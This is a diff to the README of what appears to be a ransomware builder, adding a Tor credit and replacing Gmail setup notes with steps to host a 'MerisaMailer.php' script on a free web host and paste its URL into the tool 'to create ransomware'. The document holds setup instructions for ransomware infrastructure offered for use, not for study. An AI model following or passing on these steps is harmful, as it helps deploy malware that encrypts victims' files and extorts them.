@@ -52,12 +52,13 @@ Legal Disclamer
 Credits
 =
 - shc : http://www.datsi.fi.upm.es/~frosal/
+- tor : https://www.torproject.org
 
 
 Configuration 
 =
-     In order to allow insecure send of mails you need to configure your Gmail account by visiting  
-     this link : https://myaccount.google.com/lesssecureapps?rfn=27&rfnc=1&eid=-8528583655958181045&et=1&asae=2&pli=1
+     Upload MerisaMailer.php on your server or on a free one like: https://www.000webhost.com/
+     After that just copy the URL + Path to MerisaMailer.php script and use them to create ransomware
 
 
 Known Issues
